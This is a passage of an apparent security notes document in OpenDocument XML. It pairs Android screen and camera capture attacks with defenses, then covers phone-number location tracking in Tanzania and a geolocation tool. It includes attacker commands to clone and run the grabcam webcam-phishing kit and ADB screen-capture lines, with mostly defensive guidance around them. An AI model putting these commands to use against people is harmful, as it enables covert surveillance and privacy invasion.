      <text:p text:style-name="Preformatted_20_Text">adb kill-server</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On the device, you can also do this via: Settings &gt; Developer Options &gt; Revoke <text:soft-page-break/>USB debugging authorizations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>3.</text:span> Monitor ADB Connections: On a rooted device, a security-conscious user could monitor for new ADB connections.</text:p>
      <text:p text:style-name="P28"><text:s text:c="6"/><text:span text:style-name="T6"># Check for any process listening on the ADB port (usually 5555)</text:span></text:p>
      <text:p text:style-name="P29">netstat -an | grep 5555</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 1.2:</text:span> Malware-Based Screen Capture using MediaProjection and AccessibilityService</text:p>
      <text:p text:style-name="Preformatted_20_Text">More sophisticated malware doesn't need ADB. It can use legitimate Android APIs to capture the screen, often by tricking the user into granting permission or by abusing system services .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Malware's Technique:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ MediaProjection API: This is the official way for apps to record the screen. However, using it requires the app to display a system dialog prompt asking the user for permission. Malware tries to make this prompt look legitimate or appear at a time when the user is likely to click "Allow" .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ AccessibilityService Abuse: This is a far more dangerous vector. The AccessibilityService is designed to help users with disabilities by reading screen content and performing actions on their behalf. Malware can trick users into enabling this service for a malicious app. Once enabled, the app has extensive privileges, including the ability to read any text displayed on the screen and, in some cases, to capture its contents .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 1.2:</text:span> <text:span text:style-name="T3">Permission Auditing and App Vettin</text:span>g</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defending against API-based screen capture requires a combination of user awareness and technical controls.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Defender's Actions:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">1.</text:span> Review Accessibility Service Settings: You should regularly check which apps have been granted Accessibility privileges.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ User Command (on device): Go to Settings &gt; Accessibility &gt; Installed services. Scrutinize every app on this list. If you see an app you don't recognize or that shouldn't need this power (e.g., a simple flashlight app), turn it off immediately.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">2.</text:span> Be Wary of Screen Recording Prompts: When an app requests permission to "record the screen," be extremely suspicious. Only grant this to trusted apps like video conferencing tools or screen recorders you intentionally installed.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>3.</text:span> Use Application Vetting Tools: For organizations or advanced users, tools like MobSF (Mobile Security Framework) can statically analyze an APK for dangerous permissions and API calls before installation .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/># Run MobSF in a Docker container to analyze a suspicious APK</text:p>
      <text:p text:style-name="Preformatted_20_Text">docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Then, upload the APK via the web UI at http://localhost:8000.</text:p>
      <text:p text:style-name="Preformatted_20_Text"># MobSF will generate a report highlighting the use of MediaProjection or AccessibilityService.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 1.3:</text:span> <text:span text:style-name="T4">Advanced Side-Channel Attack - "Pixnapping" (CVE-2025-48561)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">This is the most advanced and alarming category of screen capture. As detailed in research, "Pixnapping" allows a malicious app with no special permissions to reconstruct what is on the screen by exploiting how the Graphics Processing Unit (GPU) and display pipeline work .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Malware's Technique (Conceptual):</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">1. Target Invocation:</text:span> The malicious app silently launches a target app <text:soft-page-break/>(e.g., Google Authenticator) in the background using an Intent.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P30"><text:s text:c="8"/><text:span text:style-name="T2">2. Pixel Isolation:</text:span> It overlays a series of nearly transparent windows on top of the target app's hidden window. These windows are crafted to isolate a single pixel from the target app.</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">3. Side-Channel Leak:</text:span> It exploits a known GPU vulnerability (like GPU.zip) to measure the time it takes to compress and render this complex stack of windows. This timing variation reveals the value of the isolated pixel.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>4. Reconstruction:</text:span> By repeating this process for hundreds of pixels, the app can reconstruct an entire one-time password or other sensitive information in under 30 seconds .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 1.3:</text:span> <text:span text:style-name="T3">Apply Patches and Limit App Capabilities</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Defending against attacks like Pixnapping is difficult because they exploit fundamental system design.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T3">• The Defender's Actions:</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>1. Apply Security Patches:</text:span> The primary defense is for Google and device manufacturers (OEMs) to release patches. Google has partially addressed this, and a more complete fix was expected in the December 2025 security bulletin . Users must install these updates.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">2. Limit Background Activity:</text:span> A proactive defense for app developers is to hide sensitive content when their app goes into the background. This prevents the malicious app from targeting it, even if the side-channel exists . This is done programmatically within the app itself.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P28"><text:s text:c="5"/><text:span text:style-name="T7"><text:s/>// Example of a mitigation technique within an Android app (Kotlin/Java concept)</text:span></text:p>
      <text:p text:style-name="P31">// The app overrides the onPause() method to hide its sensitive views.</text:p>
      <text:p text:style-name="P31">override fun onPause() {</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>super.onPause()</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>// Hide all sensitive views (e.g., the text view showing a 2FA code)</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>sensitiveTextView.visibility = View.INVISIBLE</text:p>
      <text:p text:style-name="P31">}</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31">override fun onResume() {</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>super.onResume()</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>// Restore the views when the app is back in the foreground</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>sensitiveTextView.visibility = View.VISIBLE</text:p>
      <text:p text:style-name="P31">}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P32">Part 2: Camera Access Exploitation</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="Preformatted_20_Text">Gaining unauthorized access to the camera is a direct invasion of physical privacy. Attackers use several methods, from simple social engineering to exploiting system vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 2.1: </text:span>Social Engineering via Phishing Pages (e.g., Grabcam, CamSpy)</text:p>
      <text:p text:style-name="Preformatted_20_Text">This is a common, low-sophistication attack. Tools like grabcam or camspy create a malicious webpage that requests camera access under a false pretense (e.g., "You must allow camera to verify you are human") .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">The Attacker's Commands (using a tool like grabcam):</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P33"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T2">1. Clone and Run the Tool:</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="10"/>The attacker downloads a script from GitHub.</text:p>
      <text:p text:style-name="P28"><text:s text:c="6"/><text:span text:style-name="T7"><text:s/>git clone https://github.com/D4XT/grabcam</text:span></text:p>
      <text:p text:style-name="P31">cd grabcam</text:p>
      <text:p text:style-name="P31">bash grabcam.sh</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P33"><text:s text:c="3"/><text:span text:style-name="T2"><text:s/>2. Select Port Forwarding:</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T2"><text:s text:c="8"/></text:span><text:s/>The tool presents a menu to select a port forwarding service (like ngrok or serveo) to make the local webpage accessible from the internet.</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/><text:span text:style-name="T2"><text:s/>3. Send the Link:</text:span> The tool generates a malicious link (e.g., http://something.ngrok.io). The attacker sends this link to the target via email, SMS, or social media, disguising it as a enticing offer or an important alert.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">4. Victim Interaction:</text:span> If the target clicks the link and grants camera permission when prompted by their browser, the webpage captures an image and sends it directly to the attacker's machine .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 2.1:</text:span><text:span text:style-name="T4"> Browser Security and Permission Awareness</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Defender's Actions:</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>1.</text:span> Never Grant Camera Access to Suspicious Sites: Be extremely cautious when any website asks for camera permission. Legitimate sites that need your camera (like Zoom or a video chat site) will usually do so in a context you expect. An unknown link promising a free gift should never be trusted.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">2.</text:span> Check Browser Permissions: You can review which websites you have granted camera access to.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ On Chrome: Go to Settings &gt; Site settings &gt; Camera. Here you will see a list of sites that are allowed or blocked.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>3.</text:span> Use a Cover: For physical privacy, many people now use camera covers (physical sliders or stickers) on their laptops and phones. This is a 100% effective defense against any software-based camera access.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 2.2:</text:span><text:span text:style-name="T4"> Malware with Direct Camera Access (e.g., ShotDroid)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">More sophisticated malware, like ShotDroid, can be installed on a device and directly access the camera to capture photos or video . This often requires the malware to have the CAMERA permission declared in its manifest .</text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/>• The Malware's Manifest Entry:</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>&lt;!-- In the malware's AndroidManifest.xml --&gt;</text:p>
      <text:p text:style-name="P31"><text:s text:c="13"/>&lt;uses-permission android:name="android.permission.CAMERA" /&gt;</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="6"/><text:span text:style-name="T4">Explanation:</text:span> This line requests access to the camera. On modern Android, this is a "dangerous" permission, meaning the app must prompt the user at runtime. However, if the user is tricked into installing the app from outside the Play Store and grants the permission, the malware can then use the standard Android camera API to take pictures at will.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 2.2:</text:span> <text:span text:style-name="T4">Permission Auditing and App Vettin</text:span>g</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T8">• The Defender's Commands:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">1.</text:span> Audit Installed App Permissions: Regularly review the permissions granted to your apps.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>▪ User Command (on device): Go to Settings &gt; Apps &gt; See all apps. <text:soft-page-break/>Select an app and tap Permissions. Revoke any permission that seems excessive. A simple calculator app should not have permission to access your camera.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>2.</text:span> Use ADB to List Dangerous Permissions: For a more comprehensive audit, you can use ADB (with USB Debugging enabled for your own device) to list all apps that have been granted specific permissions.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P28"><text:s text:c="5"/><text:span text:style-name="T7"><text:s/># List all packages that have been granted the CAMERA permission</text:span></text:p>
      <text:p text:style-name="P31">adb shell pm list packages -e -f | while read line; do</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>pkg=$(echo $line | cut -d: -f2 | cut -d= -f1)</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>if adb shell dumpsys package $pkg | grep -q "android.permission.CAMERA: granted=true"; then</text:p>
      <text:p text:style-name="P31"><text:s text:c="8"/>echo "$pkg has camera permission"</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>fi</text:p>
      <text:p text:style-name="P31">done</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Attack 2.3: </text:span><text:span text:style-name="T4">WebView Permission Inheritance Vulnerability</text:span></text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="Preformatted_20_Text">This is a more technical attack that abuses a flaw in how Android's WebView component handles permissions .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">• The Malware's Technique:</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>1.</text:span> Setup: A malicious app creates a WebView with specific, vulnerable settings (setSupportMultipleWindows(false) and no proper onCreateWindow handler).</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">2.</text:span> First Page: It loads a first website in the WebView and tricks the user into granting camera access for that site.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/><text:span text:style-name="T2"><text:s/>3.</text:span> Silent Navigation: It then uses JavaScript (window.open()) to load a second, malicious website. Because of the flawed settings, this new page loads in the same WebView.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/><text:span text:style-name="T2">4. </text:span>Permission Inheritance: The second, malicious website inherits the camera permission granted to the first site without prompting the user again .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Defense 2.3:</text:span> <text:span text:style-name="T4">Application Developer Responsibility</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">This is a vulnerability that must be fixed by app developers who use WebView.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Defender's Action (for Developers):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Properly Implement onCreateWindow: Any app using a WebView must properly override the WebChromeClient.onCreateWindow() method to handle new window requests securely, ensuring they are opened in a new, isolated WebView instance.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Keep System WebView Updated: Users should ensure that Android System WebView is updated via the Google Play Store, as it contains fixes for such vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Summary Table:</text:span> Attack vs. Defense Commands</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Attack Vector<text:tab/> <text:s text:c="8"/>Attack Command/Technique<text:tab/> <text:s text:c="6"/>Defense Command/Action</text:p>
      <text:p text:style-name="Preformatted_20_Text">ADB Screen Capture<text:tab/>adb shell screencap /sdcard/screen.png<text:tab/>Disable USB Debugging in Settings</text:p>
      <text:p text:style-name="Preformatted_20_Text">ADB Screen Recording<text:tab/>adb shell screenrecord /sdcard/video.mp4<text:tab/>Revoke USB debugging authorizations</text:p>
      <text:p text:style-name="Preformatted_20_Text">AccessibilityService Abuse<text:tab/>Malware enables service via user trickery<text:tab/>Review Settings &gt; Accessibility &gt; Installed services</text:p>
      <text:p text:style-name="Preformatted_20_Text">Pixnapping (CVE-2025-48561)<text:tab/>No direct command; side-channel attack<text:tab/>Apply Android Security Patches (Dec 2025+)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Phishing Page (Grabcam)<text:tab/>bash grabcam.sh (attacker)<text:tab/>Never grant camera access to <text:soft-page-break/>unknown sites</text:p>
      <text:p text:style-name="Preformatted_20_Text">Malware (ShotDroid)<text:tab/>Malware uses CAMERA permission<text:tab/>Audit permissions: adb shell dumpsys package ...</text:p>
      <text:p text:style-name="Preformatted_20_Text">WebView Vulnerability<text:tab/>Flawed app settings cause permission inheritance<text:tab/>Update Android System WebView via Play Store</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">In conclusion,</text:span> the threats to your screen and camera are real and varied, ranging from simple social engineering to complex hardware side-channel attacks. The defense is equally multi-layered: it requires vigilance (checking permissions and links), technical hygiene (disabling ADB, applying patches), and for developers, secure coding practices (properly configuring WebViews and hiding sensitive content in the background).</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P36">DETAMINING LOCATION USING PHONE NUMBER</text:p>
      <text:p text:style-name="Preformatted_20_Text">Excellent and important question. The short answer is yes, it is possible for sophisticated actors to determine your approximate location using only your phone number in Tanzania, and there are several ways this can happen. However, for an average person, it is not a simple task and requires access to specific systems or vulnerabilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Based on the search results and technical knowledge, here is a detailed breakdown of how this can be done and the defenses available to you.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">📡 How Location Tracking by Phone Number Works:</text:p>
      <text:p text:style-name="Preformatted_20_Text">There are three primary mechanisms through which your location can be tracked using just your phone number, ranging from low-tech to highly sophisticated.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1. Mobile Network Operator (MNO) Infrastructure (Cell Tower Triangulation)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">This is the most fundamental method. Your phone is constantly communicating with cell towers to maintain network connectivity. This process, called Cell Tower Triangulation, happens automatically and is managed by your mobile network operator (like Vodacom, Airtel, or Tigo in Tanzania) .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works: Your phone sends out signals to find the best tower to connect to. The network measures the signal strength and the time it takes for the signal to travel between your phone and multiple nearby towers. By comparing this data from at least three towers, the carrier can estimate your device's location within a specific radius .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Who Can Access It: This level of location data is primarily accessible to the mobile network operator itself. As seen in reports from Tanzania, there have been serious allegations and legal cases where this data was shared with government agencies. For example, a former employee of Tigo's parent company testified in a British court that the company shared mobile phone data showing the location of opposition leader Tundu Lissu in the weeks before a 2017 assassination attempt on him . This demonstrates a real-world instance where phone number-linked location data was accessed and used.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2. Exploiting Global Telecom Vulnerabilities (SS7 Attacks)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">This is a more advanced and concerning method that does not require cooperation from your local carrier. The global telecom network relies on a set of protocols called Signaling System No. 7 (SS7) . Unfortunately, SS7 was designed decades ago with trust, not security, in mind, and it has known vulnerabilities .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works: If a hacker or a sophisticated actor can gain access to the SS7 network, they can send specific queries using just your phone number. These queries can effectively ask the network for your current location, intercept your calls and text messages (including 2FA codes), and forward your calls .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Threat: This is a global issue, not limited to Tanzania. A cybersecurity professional in Tanzania noted that if bad actors exploit this vulnerability, it could become a massive threat to businesses and individuals in the country .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4">3. Open-Source Intelligence (OSINT) and Public Databases</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">This method relies on information that is, or can become, publicly available. It is less about "hacking" and more about "harvesting."</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• How it Works:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Data Brokers: Your location data can be collected from various apps and services by data brokers, who then compile and sell this information. Mobile carriers have also been known to sell access to location data to these third-party aggregators .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>◦ Public Tools: Tools exist that can provide basic information linked to a phone number. For instance, a GitHub project called "J Phone NoTracker" claims to use the phonenumbers library and geolocation services to provide city-level coordinates for numbers, including Tanzanian numbers . While this tool likely relies on mapping the number's area code and prefix to a general location (like the city of the carrier's headquarters), it shows how easily accessible some information can be. Similarly, there are specific libraries created to identify Tanzanian mobile operators (like Vodacom, Airtel) based on a number's prefix . Knowing your carrier is the first step for more targeted attacks.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">🛡️ Defensive Measures: How to Protect Yourself</text:p>
      <text:p text:style-name="Preformatted_20_Text">While you cannot completely disappear from the grid without turning off your phone, you can take significant steps to make yourself much harder to track.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1. Digital Hygiene and Device Settings</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Manage App Permissions: Regularly audit which apps have permission to access your location, microphone, and camera. Disable these permissions for any app that doesn't absolutely need them . On both Android and iOS, go into your Privacy or Location settings to do this.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Wi-Fi and Bluetooth Scanning: Even when Wi-Fi and Bluetooth are "off," your phone might still be scanning for networks and devices to improve location services. Go into your location settings and ensure Wi-Fi Scanning and Bluetooth Scanning are disabled .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Manage Your Advertising ID: Your phone has a unique advertising ID that advertisers use to track you across apps. On Android, you can delete this ID in the "Ads" section of your settings. On iOS, you can turn off "Allow Apps to Request to Track" .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2. Communication and Online Behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Encrypted Messaging Apps: For calls and messages, switch to apps that offer end-to-end encryption, such as Signal or WhatsApp . This prevents the content of your communication from being intercepted, even if someone is monitoring the SS7 network.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid SMS for Two-Factor Authentication (2FA): Given the vulnerability of SMS to SS7 attacks, use app-based authenticators like Google Authenticator, Authy, or hardware tokens like YubiKey for 2FA whenever possible .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use a VPN: A Virtual Private Network (VPN) hides your IP address, which can provide an approximate location to websites and services . Choose a reputable "no-log" VPN provider.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">3. Advanced and Physical Measures</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• The Nuclear Option: Airplane Mode or Power Off: The only way to completely stop your phone from communicating with cell towers is to put it in Airplane Mode or turn it off . This prevents triangulation, SS7 queries, and data collection. This is the most effective defense when you need absolute location privacy.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider a Privacy-Focused Device: For users with extreme privacy needs, consider using a device with a privacy-oriented operating system like GrapheneOS, or maintain a separate, "clean" device for sensitive activities like banking, with no extra apps or browsing .</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Compartmentalize Your Identity: Use different email addresses and usernames for different services. This makes it harder for data brokers to link your data into a single profile. Services like SimpleLogin can create email aliases to further protect your primary email .</text:p>
      <text:p text:style-name="Preformatted_20_Text">In conclusion, while tracking by phone number is a real threat, especially through carrier data sharing and global protocol vulnerabilities , you have a powerful set of tools at your disposal to defend yourself. By understanding how the tracking works and consistently applying these defensive measures, you can significantly reduce your digital footprint and protect your location privacy in Tanzania.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker: A Deep Technical Analysis of Phone Number Geolocation</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">1. Concept Foundation</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">1.1 Definition and Core Principles</text:p>
      <text:p text:style-name="Preformatted_20_Text">The J Phone NoTracker is a Python-based application that claims to provide geographic location information (city-level coordinates) from a phone number, with specific support for Tanzanian numbers (+255). At its core, it uses prefix-based geocoding—a technique that maps telephone numbering plan prefixes to geographic regions .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The fundamental principle is surprisingly simple: telephone numbers are not random. They follow strict international and national numbering plans that encode geographic information:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Country Code: The first part (+255 for Tanzania) identifies the country</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• National Destination Code (NDC) / Area Code: The next digits identify a specific geographic region or mobile operator within the country</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Subscriber Number: The remaining digits identify the individual line</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">For Tanzanian fixed-line numbers, the NDC (area code) directly corresponds to a physical region. For example, the area code 22 is allocated to the Dar es Salaam Region, while 24 covers Zanzibar .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">For mobile numbers, the prefix identifies the mobile network operator (MNO) rather than a precise geographic location. Tanzanian mobile numbers start with 6 or 7, with specific prefixes like 74, 75, 76 allocated to Vodacom, 68, 69, 78 to Airtel, and 65, 67, 71, 77 to tiGO .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1.2 Why This Technology Exists</text:p>
      <text:p text:style-name="Preformatted_20_Text">Phone number geolocation solves several real-world problems:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. E-commerce Localization: Online stores can automatically display prices in local currency and suggest nearby pickup points based on the customer's area code</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Fraud Detection: Financial institutions can flag transactions where the phone number's region doesn't match the user's typical location</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Emergency Services: Routing emergency calls to the correct local dispatch center</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Regulatory Compliance: Verifying that users are in jurisdictions where services are legally permitted</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Marketing Analytics: Understanding geographic distribution of customer bases</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P7"><text:soft-page-break/>1.3 Comparison with Alternative Technologies</text:p>
